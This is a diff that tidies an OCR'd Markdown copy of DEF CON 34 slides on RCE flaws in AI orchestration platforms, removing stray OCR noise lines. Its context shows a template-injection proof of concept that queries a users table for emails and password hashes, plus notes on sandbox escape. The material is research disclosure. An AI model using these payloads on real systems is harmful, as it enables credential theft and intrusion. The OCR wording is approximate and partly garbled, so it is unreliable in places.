@@ -22,7 +22,6 @@ converted_at: "2026-08-12T00:27:03Z"
 **Conference:** DEF CON 34  
 **Source:** `DEF CON 34/DEF CON 34 - Peyton Kennedy - Hacking Your Life with AI Can Get You Hacked How AI Orchestration Platforms Ship RCE by Design - V1.pdf` (58 pages)
 
-
 ## Slide 1
 
 > Text below was recovered by OCR from an image-only slide; treat wording as approximate.
@@ -53,7 +52,6 @@ trusted to run code on the host.”
 ```text
 whoami
 The hunt
-an 7 13 a
 Peyton Kennedy
 Senior Security Researcher platforms findings languages
 Endor Labs audited disclosed Java - Python : TS + Go
@@ -67,7 +65,6 @@ Endor Labs audited disclosed Java - Python : TS + Go
 Section 1 - The attack surface
 What Al orchestration platforms are
 Trigger LLM node Code node Output
-— — —_
 webhook + schedule prompt + agent python - js action - deploy
 Drag-and-drop workflows with LLM nodes, Webhooks, and
 connectors. Deployed as critical infrastructure.
@@ -293,7 +290,6 @@ Authorization: Bearer $TOKEN # member role
 Content-Type: application/json
 {"values":{"template":"{{ ((c)=>c.koaCtx.app.db.sequelize.query(\"SELECT id,email,password FROM users\")) (ctx) }}"}}
 The users table, hashes included, in the response.
-POC 2 + ESCALATE TO OS
 POST /api/variables: resolve HTTP/1.1
 Host: TARGET: 13000
 Authorization: Bearer $TOKEN # member role
@@ -662,7 +658,6 @@ DANGER ZONE - unconfined
 + NoNewPrivs = Q,noseccomp filter
 2 attacker payload lands here
 Attacker code executes in the unconfined zone.
-see eee ee ee = = = DifySeccomp()
 SAFE ZONE - confined
 + chroot+seccomp+setuid
 + Only user code runs here, fully confined
@@ -970,7 +965,6 @@ runs outside any auth boundary
 Section 3 - Pattern analysis
 Five patterns, mapped to the spectrum
 ACCIDENTAL INTENTIONAL >
-a 2 8 4 5
 Velocity outpacing LLM output trusted as Sandbox escape via Trust boundary Documentation as
 review code execution ordering mismatch attack surface
 Nocobase Flowise - Langflow Dify - Activepieces Kestra - Langflow flag - Airflow
